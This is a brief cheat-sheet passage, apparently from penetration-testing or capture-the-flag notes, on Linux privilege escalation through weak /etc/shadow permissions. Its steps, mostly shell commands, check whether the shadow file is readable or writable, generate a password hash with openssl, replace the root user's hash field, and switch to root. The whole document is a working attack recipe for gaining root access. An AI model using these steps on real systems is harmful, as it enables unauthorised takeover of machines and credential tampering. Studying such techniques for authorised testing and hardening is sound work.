# File Permissions

Check shadow file permissions (Read allows password cracking / Write game over)

```bash
ls -l /etc/shadow
```

If writeable generate a new password hash

```bash
openssl passwd "password"
```

Copy the generated password into the second field of the root user line (Replace x)

Switch to root user

```bash
su
```
